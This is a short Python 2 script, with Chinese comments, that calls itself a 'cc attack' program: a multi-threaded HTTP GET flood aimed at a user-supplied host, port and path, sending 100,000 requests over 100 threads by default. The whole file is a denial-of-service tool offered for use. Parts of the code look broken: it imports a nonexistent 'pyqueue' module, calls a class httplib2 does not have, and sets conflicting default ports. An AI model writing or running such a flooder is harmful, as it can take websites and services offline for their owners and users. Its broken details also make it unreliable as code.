#!/usr/bin/python  
#coding=utf-8  
import sys  
import threading  
import pyqueue
import httplib2
import argparse  


# HTTP的话用httplib－HTTPConnection，HTTPS的话用httplib－HTTPSConnection
# 参考文章
# https://blog.csdn.net/seeground/article/details/49488475

   
def get_parse():  
    parser = argparse.ArgumentParser(description='A cc attack python program')
    parser.add_argument('-j', help="number of total jobs, default number 100000", action="store", dest="j", default=100000, type=int)
    parser.add_argument('-n', help="number of threads, default thread 100", action="store", dest="n", default=100, type=int)
    parser.add_argument('-u', help="url or ip, for example: '[url]www.zz2u.com[/url]' or '192.157.233.244′", action="store", dest="u")
    parser.add_argument('-i', help="index, for example: '/index.php', if null input '/' or  not use -i,default '/'", action="store", dest="i", default="/")  
    parser.add_argument('-p', help="port, default 80 ", action="store", dest="p", default=80, type=int)  
    if(len(sys.argv)< 2):
        parser.print_help()
        sys.exit()
    return parser.parse_args()  


def get_request(url, index='/', port=443):
    try:  
        conn = httplib2.HTTPSConnection(url, port, timeout=0.01)
        conn.request("GET", index)  
        r1 = conn.getresponse()  
        #print r1.status, r1.reason  
    except:
        pass  
   
class Worker(threading.Thread):  
    def __init__(self, name, queue, url, index, port):  
        threading.Thread.__init__(self)  
        self.queue = queue  
        self.url = url  
        self.index =index  
        self.port = port  
        self.start()  
    def run(self):  
        # 著名的死循环，保证接着跑下一个任务  
        while True:  
            # 队列为空则退出线程  
            if self.queue.empty():  
                break  
            # 获取一个项目  
            foo = self.queue.get()  
            # 模拟你要做的事情  
            get_request(self.url, self.index, self.port)
            # 打印  
            print self.getName(),':', foo  
            # 告诉系统说任务完成  
            self.queue.task_done()  
   
def start_work():  
    args = get_parse()  
    job_num = args.j  
    thread_num = args.n  
    url = args.u  
    index = args.i  
    port = args.p  
    #print args, job_num, thread_num, url, index  
    # 队列  
    queue = pyqueue.Queue()
    # 加入任务队列个数  
    for i in range(job_num):  
        queue.put(i)  
    # 开线程个数  
    for i in range(thread_num):  
        threadName = 'Thread' + str(i)  
        Worker(threadName, queue, url, index, port)  
# 所有线程执行完毕后关闭  
    queue.join()  
   
if __name__ == '__main__':
    start_work()  